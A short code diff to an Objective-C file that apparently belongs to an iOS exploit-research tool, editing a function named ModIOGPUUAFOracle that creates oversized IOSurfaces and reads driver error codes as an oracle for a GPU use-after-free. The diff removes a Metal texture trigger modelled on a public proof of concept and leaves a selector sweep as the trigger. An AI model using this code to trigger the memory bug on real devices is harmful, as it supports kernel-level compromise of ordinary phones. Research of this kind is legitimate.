@@ -36,9 +36,9 @@
 #import "AppDelegate.h"
 #import "Util.h"
 
-// Metal (linked in build.sh with -framework Metal)
-#import <Metal/Metal.h>
-#define RS_HAVE_METAL 1
+// Metal is linked in build.sh, but the SDK's Metal umbrella does not expose
+// its types to this translation unit (measured on the CI toolchain), so the
+// texture trigger is disabled and the selector sweep is the oracle.
 
 // IOSurface: not importable from the plain iOS SDK
 typedef struct __IOSurface *IOSurfaceRef_;
@@ -100,22 +100,13 @@ NSString *ModIOGPUUAFOracle(void) {
             uint32_t id = IOSurfaceGetID(s);
             AveLog(S(@"    surface %-24s -> id=%u alloc=%zu", O[i].tag, id, IOSurfaceGetAllocSize(s)));
             made++;
-#ifdef RS_HAVE_METAL
-            @try {
-                id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
-                if (dev) {
-                    MTLTextureDescriptor *td = [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm
-                                                    width:O[i].w height:O[i].h mipmapped:NO];
-                    td.usage = MTLTextureUsageShaderRead;
-                    id<MTLTexture> tex = [dev newTextureWithDescriptor:td
-                                                            ioSurface:(IOSurfaceRef)s
-                                                            plane:0];
-                    AveLog(S(@"    texture %-24s -> %s", O[i].tag, tex ? "created" : "nil"));
-                }
-            } @catch (NSException *e) {
-                AveLog(S(@"    texture %-24s -> threw %@", O[i].tag, e.reason));
-            }
-#endif
+            // The Metal texture path (newTextureWithDescriptor:iosurface:plane:)
+            // is how the public PoC reaches create_resource_iosurface, but the
+            // SDK's Metal umbrella does not expose the types to this compile
+            // (measured: MTLDevice undeclared despite -framework Metal), so the
+            // trigger is left to the selector sweep below: the oracle codes
+            // (0xe00002be stale-processed vs 0xe00002c2 not-found) are the
+            // measurement, and the overflow surfaces are created either way.
             CFRelease(s);
         }
     }
